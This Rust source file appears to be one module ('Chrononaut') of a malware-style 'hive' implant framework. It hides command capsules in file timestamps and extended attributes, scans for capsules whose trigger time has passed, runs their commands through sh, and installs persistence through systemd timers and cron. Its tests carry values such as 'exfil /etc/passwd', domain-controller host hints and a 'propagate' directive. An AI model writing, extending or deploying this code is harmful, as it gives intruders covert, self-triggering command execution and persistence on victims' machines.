use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeCapsule {
    pub capsule_id: Uuid,
    pub trigger_timestamp: u64,      // Unix epoch: execute when this time arrives
    pub command: String,             // action to execute
    pub payload: Vec<u8>,            // optional encrypted payload
    pub host_hint: String,           // which host this targets
    pub executed: bool,
}

pub struct Chrononaut;

impl Default for Chrononaut {
    fn default() -> Self {
        Self::new()
    }
}

impl Chrononaut {
    pub fn new() -> Self { Self }

    /// Encode a command into a file's modification timestamp.
    /// Uses sub-second precision to encode capsule metadata.
    /// Also stores the full capsule in xattr (Linux) or companion file (other platforms)
    /// to enable lossless roundtrip via `decode_from_timestamp`.
    pub fn encode_in_timestamp(path: &Path, capsule: &TimeCapsule) -> Result<(), String> {
        if !path.exists() {
            return Err("Target file not found".into());
        }

        let metadata = std::fs::metadata(path).map_err(|e| e.to_string())?;
        let accessed = metadata.accessed().unwrap_or_else(|_| std::time::SystemTime::now());

        // Encode trigger_timestamp in the mtime seconds
        // Use capsule_id low bits as nanosecond marker
        let nanos = (capsule.capsule_id.as_u128() % 999_999) as u32;
        let _mtime = std::time::UNIX_EPOCH
            + std::time::Duration::from_secs(capsule.trigger_timestamp)
            + std::time::Duration::from_nanos(nanos as u64);

        // Use std library's set_times (available in Rust 1.75+)
        #[cfg(target_os = "linux")]
        {
            // Convert to filetime for libc utimensat
            let atime = libc::timespec {
                tv_sec: accessed.duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default().as_secs() as i64,
                tv_nsec: 0,
            };
            let mtime_ts = libc::timespec {
                tv_sec: capsule.trigger_timestamp as i64,
                tv_nsec: nanos as i64,
            };

            let path_c = std::ffi::CString::new(path.to_str().unwrap())
                .map_err(|e| e.to_string())?;
            let res = unsafe {
                libc::utimensat(
                    libc::AT_FDCWD,
                    path_c.as_ptr(),
                    &[atime, mtime_ts] as *const libc::timespec,
                    0,
                )
            };
            if res != 0 {
                return Err(format!("utimensat failed: {}", std::io::Error::last_os_error()));
            }

            // Also store the full capsule in xattr for roundtrip recovery
            Self::store_in_xattr(path, capsule)?;
        }

        #[cfg(not(target_os = "linux"))]
        {
            let _ = accessed;
            let _ = _mtime;
            // Store alongside as companion file
            let data = serde_json::to_vec(capsule).map_err(|e| e.to_string())?;
            let companion = path.with_extension("hive_chrono");
            std::fs::write(&companion, &data).map_err(|e| e.to_string())?;
        }

        Ok(())
    }

    /// Decode a time capsule from a file's mtime.
    ///
    /// Recovery strategy (in order):
    /// 1. Linux: read extended attribute `user.hive_chrono` written by `encode_in_timestamp`
    /// 2. Other platforms: read companion `.hive_chrono` file
    /// 3. Fallback: reconstruct a capsule from the mtime metadata only
    pub fn decode_from_timestamp(path: &Path, _capsule_id: Uuid) -> Result<TimeCapsule, String> {
        if !path.exists() {
            return Err("File not found".into());
        }

        // Try full-capsule recovery first
        #[cfg(target_os = "linux")]
        {
            if let Ok(capsule) = Self::load_from_xattr(path) {
                return Ok(capsule);
            }
        }

        #[cfg(not(target_os = "linux"))]
        {
            let companion = path.with_extension("hive_chrono");
            if companion.exists() {
                let data = std::fs::read(&companion).map_err(|e| e.to_string())?;
                if let Ok(capsule) = serde_json::from_slice(&data) {
                    return Ok(capsule);
                }
            }
        }

        // Fallback: reconstruct what we can from the mtime
        let metadata = std::fs::metadata(path).map_err(|e| e.to_string())?;
        let mtime = metadata.modified().map_err(|e| e.to_string())?;
        let duration = mtime.duration_since(std::time::UNIX_EPOCH).map_err(|e| e.to_string())?;

        let trigger_secs = duration.as_secs();
        let nanos = duration.subsec_nanos();

        // Reconstruct the capsule_id low bits from the nanosecond field
        let recovered_uuid = if nanos > 0 {
            // We only stored `capsule_id.as_u128() % 999_999` in nanos,
            // so we can only partially recover. Use it as a best-effort marker.
            let low_bits = nanos as u128;
            // Build a UUID from the low bits (zero-padded in the high bits)
            let val = low_bits & 0xFFFF_FFFF_FFFF_FFFF; // keep only low 64 bits
            Uuid::from_u64_pair(0, val as u64)
        } else {
            Uuid::nil()
        };

        let cmd = format!("check_{}", path.file_name()
            .and_then(|n| n.to_str()).unwrap_or("unknown"));

        Ok(TimeCapsule {
            capsule_id: recovered_uuid,
            trigger_timestamp: trigger_secs,
            command: cmd,
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        })
    }

    /// Try to load a full capsule from Linux extended attributes.
    #[cfg(target_os = "linux")]
    fn load_from_xattr(path: &Path) -> Result<TimeCapsule, String> {
        let path_c = std::ffi::CString::new(path.to_str().unwrap())
            .map_err(|e| e.to_string())?;
        let attr = std::ffi::CString::new("user.hive_chrono")
            .map_err(|e| e.to_string())?;

        // First call with null buffer to get the size
        let size = unsafe {
            libc::getxattr(
                path_c.as_ptr(),
                attr.as_ptr(),
                std::ptr::null_mut(),
                0,
            )
        };
        if size < 0 {
            return Err("xattr not found".into());
        }

        let mut buf = vec![0u8; size as usize];
        let len = unsafe {
            libc::getxattr(
                path_c.as_ptr(),
                attr.as_ptr(),
                buf.as_mut_ptr() as *mut libc::c_void,
                buf.len(),
            )
        };
        if len < 0 {
            return Err(format!("getxattr failed: {}", std::io::Error::last_os_error()));
        }

        buf.truncate(len as usize);
        serde_json::from_slice(&buf).map_err(|e| e.to_string())
    }

    /// Store a capsule in extended attributes of a file (Linux xattr).
    pub fn store_in_xattr(path: &Path, capsule: &TimeCapsule) -> Result<(), String> {
        if !path.exists() {
            return Err("Target file not found".into());
        }

        let data = serde_json::to_vec(capsule).map_err(|e| e.to_string())?;

        #[cfg(target_os = "linux")]
        {
            let path_c = std::ffi::CString::new(path.to_str().unwrap())
                .map_err(|e| e.to_string())?;
            let attr = std::ffi::CString::new("user.hive_chrono")
                .map_err(|e| e.to_string())?;
            let res = unsafe {
                libc::setxattr(
                    path_c.as_ptr(),
                    attr.as_ptr(),
                    data.as_ptr() as *const libc::c_void,
                    data.len(),
                    0,
                )
            };
            if res != 0 {
                return Err(format!("setxattr failed: {}", std::io::Error::last_os_error()));
            }
        }

        #[cfg(not(target_os = "linux"))]
        {
            let companion = path.with_extension("hive_chrono");
            std::fs::write(&companion, &data).map_err(|e| e.to_string())?;
        }

        Ok(())
    }

    /// Scan filesystem for chrononaut capsules ready to execute.
    pub fn scan_for_triggers(root: &Path, now: u64) -> Vec<TimeCapsule> {
        let mut ready = Vec::new();
        if !root.exists() { return ready; }

        if let Ok(paths) = walkdir(root) {
            for path in paths {
                if let Ok(capsule) = Self::decode_from_timestamp(&path, Uuid::nil()) {
                    if capsule.trigger_timestamp <= now {
                        ready.push(capsule);
                    }
                }
            }
        }

        ready
    }

    /// Execute the capsule's command by writing it to a temporary shell script
    /// and running it via `sh`. Returns the stdout on success or stderr on failure.
    pub fn execute_capsule(capsule: &mut TimeCapsule) -> Result<String, String> {
        let tmp_dir = std::env::temp_dir().join("chrononaut");
        std::fs::create_dir_all(&tmp_dir).map_err(|e| e.to_string())?;

        let script_path = tmp_dir.join(format!("{}.sh", capsule.capsule_id));
        let script_content = format!("#!/bin/sh\n{}\n", capsule.command);

        std::fs::write(&script_path, &script_content).map_err(|e| e.to_string())?;

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&script_path, std::fs::Permissions::from_mode(0o755))
                .map_err(|e| e.to_string())?;
        }

        let output = std::process::Command::new("sh")
            .arg(&script_path)
            .output()
            .map_err(|e| e.to_string())?;

        let _ = std::fs::remove_file(&script_path);

        capsule.executed = true;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            Ok(stdout)
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            Err(format!("Command exited with {}: {}", output.status, stderr))
        }
    }

    /// Install a systemd service + timer unit that runs the given script periodically.
    ///
    /// Writes `/etc/systemd/system/{name}.service` and `{name}.timer`,
    /// then runs `systemctl daemon-reload`, `enable`, and `start`.
    pub fn install_systemd_timer(name: &str, script_path: &Path) -> Result<(), String> {
        let systemd_dir = Path::new("/etc/systemd/system");

        let service_content = format!(
            "[Unit]\n\
             Description=Chrononaut timer service for {name}\n\
             \n\
             [Service]\n\
             Type=oneshot\n\
             ExecStart={script}\n",
            name = name,
            script = script_path.display()
        );

        let timer_content = format!(
            "[Unit]\n\
             Description=Chrononaut timer for {name}\n\
             \n\
             [Timer]\n\
             OnCalendar=daily\n\
             Persistent=true\n\
             \n\
             [Install]\n\
             WantedBy=timers.target\n",
            name = name
        );

        let service_path = systemd_dir.join(format!("{}.service", name));
        std::fs::write(&service_path, &service_content)
            .map_err(|e| format!("Failed to write service unit: {}", e))?;

        let timer_path = systemd_dir.join(format!("{}.timer", name));
        std::fs::write(&timer_path, &timer_content)
            .map_err(|e| format!("Failed to write timer unit: {}", e))?;

        let reload = std::process::Command::new("systemctl")
            .arg("daemon-reload")
            .status()
            .map_err(|e| format!("systemctl daemon-reload failed: {}", e))?;
        if !reload.success() {
            return Err("systemctl daemon-reload returned non-zero exit".into());
        }

        let enable = std::process::Command::new("systemctl")
            .args(&["enable", &format!("{}.timer", name)])
            .status()
            .map_err(|e| format!("systemctl enable failed: {}", e))?;
        if !enable.success() {
            return Err("systemctl enable returned non-zero exit".into());
        }

        let start = std::process::Command::new("systemctl")
            .args(&["start", &format!("{}.timer", name)])
            .status()
            .map_err(|e| format!("systemctl start failed: {}", e))?;
        if !start.success() {
            return Err("systemctl start returned non-zero exit".into());
        }

        Ok(())
    }

    /// Install a cron job that runs the given script on the specified schedule.
    ///
    /// Appends the entry to the current user's crontab (via `crontab -l` + `crontab`).
    /// The `schedule` parameter follows standard cron format, e.g. `"0 2 * * *"`.
    pub fn install_cron_job(script_path: &Path, schedule: &str) -> Result<(), String> {
        let cron_line = format!("{} {}\n", schedule, script_path.display());

        // Read existing crontab (if any)
        let existing = std::process::Command::new("crontab")
            .arg("-l")
            .output()
            .ok()
            .and_then(|o| {
                if o.status.success() {
                    Some(String::from_utf8_lossy(&o.stdout).to_string())
                } else {
                    None
                }
            })
            .unwrap_or_default();

        let new_cron = format!("{}{}", existing, cron_line);

        let tmp_dir = std::env::temp_dir().join("chrononaut");
        std::fs::create_dir_all(&tmp_dir).map_err(|e| e.to_string())?;
        let tmp_cron = tmp_dir.join("cron_job.tmp");
        std::fs::write(&tmp_cron, &new_cron).map_err(|e| e.to_string())?;

        let output = std::process::Command::new("crontab")
            .arg(&tmp_cron)
            .output()
            .map_err(|e| format!("crontab failed: {}", e))?;

        let _ = std::fs::remove_file(&tmp_cron);

        if output.status.success() {
            Ok(())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            Err(format!("crontab failed: {}", stderr))
        }
    }
}

fn walkdir(root: &Path) -> Result<Vec<PathBuf>, String> {
    let mut paths = Vec::new();
    if root.is_file() {
        paths.push(root.to_path_buf());
        return Ok(paths);
    }

    if let Ok(entries) = std::fs::read_dir(root) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                if let Ok(sub) = walkdir(&path) {
                    paths.extend(sub);
                }
            } else {
                paths.push(path);
            }
        }
    }
    Ok(paths)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::hivemind::HiveDirective;
    use std::collections::HashMap;

    #[test]
    fn test_chrononaut_hivemind_integration() {
        // Chrononaut capsule can carry a HiveMind directive via xattr roundtrip
        let dir = std::env::temp_dir().join("hive_test_chrono_hive");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("directives.bin");
        std::fs::write(&file_path, b"base").unwrap();

        let directive = HiveDirective {
            directive_id: Uuid::new_v4(),
            proposer_id: Uuid::new_v4(),
            action: "propagate".into(),
            params: [("target_role".into(), "honeybee".into())].into(),
            threshold: 0.6,
            approved: false,
            executed: false,
            votes: HashMap::new(),
        };

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_700_000_000,
            command: serde_json::to_string(&directive).unwrap(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        // Store via xattr (roundtrip-capable)
        let enc = Chrononaut::store_in_xattr(&file_path, &capsule);
        assert!(enc.is_ok());

        // Verify the serialized directive is valid JSON
        let parsed: HiveDirective = serde_json::from_str(&capsule.command).unwrap();
        assert_eq!(parsed.action, "propagate");
        assert_eq!(parsed.params.get("target_role").unwrap(), "honeybee");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_store_and_decode() {
        let dir = std::env::temp_dir().join("hive_test_chrono");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("access.log");
        std::fs::write(&file_path, "test log entry").unwrap();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_700_000_000,
            command: "exfil /etc/passwd".into(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        let enc = Chrononaut::encode_in_timestamp(&file_path, &capsule);
        assert!(enc.is_ok(), "Encode should work: {:?}", enc.err());

        let decoded = Chrononaut::decode_from_timestamp(&file_path, capsule.capsule_id);
        assert!(decoded.is_ok(), "Decode should work: {:?}", decoded.err());

        // Verify roundtrip correctness
        let decoded = decoded.unwrap();
        assert_eq!(decoded.capsule_id, capsule.capsule_id,
            "capsule_id should survive roundtrip");
        assert_eq!(decoded.trigger_timestamp, capsule.trigger_timestamp,
            "trigger_timestamp should survive roundtrip");
        assert_eq!(decoded.command, capsule.command,
            "command should survive roundtrip");
        assert_eq!(decoded.payload, capsule.payload,
            "payload should survive roundtrip");
        assert_eq!(decoded.host_hint, capsule.host_hint,
            "host_hint should survive roundtrip");
        assert_eq!(decoded.executed, capsule.executed,
            "executed flag should survive roundtrip");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_xattr_store() {
        let dir = std::env::temp_dir().join("hive_test_chrono_xattr");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("config.json");
        std::fs::write(&file_path, r#"{"key":"value"}"#).unwrap();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_800_000_000,
            command: "rotate_keys".into(),
            payload: vec![1, 2, 3],
            host_hint: "dc01".into(),
            executed: false,
        };

        let result = Chrononaut::store_in_xattr(&file_path, &capsule);
        assert!(result.is_ok(), "xattr store should work: {:?}", result.err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_triggers() {
        let dir = std::env::temp_dir().join("hive_test_chrono_scan");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("marker.txt");
        std::fs::write(&file_path, "data").unwrap();

        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default().as_secs();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: now - 3600, // 1 hour ago
            command: "test".into(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        Chrononaut::encode_in_timestamp(&file_path, &capsule).unwrap();
        let ready = Chrononaut::scan_for_triggers(&dir, now);
        assert!(!ready.is_empty(), "Should find at least one ready capsule");

        // Verify roundtrip on the found capsule
        let found = &ready[0];
        assert_eq!(found.capsule_id, capsule.capsule_id);
        assert_eq!(found.trigger_timestamp, capsule.trigger_timestamp);
        assert_eq!(found.command, capsule.command);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_execute_capsule_success() {
        let mut capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_700_000_000,
            command: "echo hello_chrononaut".into(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        let result = Chrononaut::execute_capsule(&mut capsule);
        assert!(result.is_ok(), "Execution should succeed: {:?}", result.err());
        let output = result.unwrap();
        assert!(output.contains("hello_chrononaut"), "Output should contain command echo");
        assert!(capsule.executed, "Capsule should be marked executed");
    }

    #[test]
    fn test_execute_capsule_failure() {
        let mut capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_700_000_000,
            command: "exit 42".into(),
            payload: vec![],
            host_hint: "localhost".into(),
            executed: false,
        };

        let result = Chrononaut::execute_capsule(&mut capsule);
        assert!(result.is_err(), "Exit 42 should cause an error");
        assert!(capsule.executed, "Capsule should still be marked executed even on failure");
    }

    #[test]
    fn test_install_systemd_timer_permission_denied() {
        // Running as non-root, this should fail gracefully with a permission error.
        let tmp_script = std::env::temp_dir().join("chrononaut_test_script.sh");
        std::fs::write(&tmp_script, "#!/bin/sh\necho test").unwrap();

        let result = Chrononaut::install_systemd_timer("test_chrono_unit", &tmp_script);
        assert!(result.is_err(), "systemd install should fail without root");
        let err = result.err().unwrap();
        // Should mention permission denied or similar
        assert!(err.contains("denied") || err.contains("Failed") || err.contains("failed"),
            "Error should indicate failure: {}", err);

        let _ = std::fs::remove_file(&tmp_script);
    }

    #[test]
    fn test_install_cron_job_permission_denied() {
        // Writing to crontab may fail gracefully in test environments.
        let tmp_script = std::env::temp_dir().join("chrononaut_cron_test.sh");
        std::fs::write(&tmp_script, "#!/bin/sh\necho test").unwrap();

        let result = Chrononaut::install_cron_job(&tmp_script, "0 2 * * *");
        // This may succeed or fail depending on environment; either is acceptable.
        // We just verify no panic and a Result is returned.
        assert!(result.is_ok() || result.is_err());

        let _ = std::fs::remove_file(&tmp_script);
    }

    #[test]
    fn test_roundtrip_with_payload_and_host_hint() {
        let dir = std::env::temp_dir().join("hive_test_chrono_roundtrip");
        let _ = std::fs::create_dir_all(&dir);
        let file_path = dir.join("payload_test.bin");
        std::fs::write(&file_path, b"base data").unwrap();

        let capsule = TimeCapsule {
            capsule_id: Uuid::new_v4(),
            trigger_timestamp: 1_900_000_000,
            command: "process_payload".into(),
            payload: vec![0xDE, 0xAD, 0xBE, 0xEF],
            host_hint: "dc42.prod.internal".into(),
            executed: false,
        };

        Chrononaut::encode_in_timestamp(&file_path, &capsule).unwrap();

        let decoded = Chrononaut::decode_from_timestamp(&file_path, Uuid::nil()).unwrap();
        assert_eq!(decoded.capsule_id, capsule.capsule_id);
        assert_eq!(decoded.trigger_timestamp, capsule.trigger_timestamp);
        assert_eq!(decoded.command, capsule.command);
        assert_eq!(decoded.payload, capsule.payload);
        assert_eq!(decoded.host_hint, capsule.host_hint);
        assert_eq!(decoded.executed, capsule.executed);

        let _ = std::fs::remove_dir_all(&dir);
    }
}
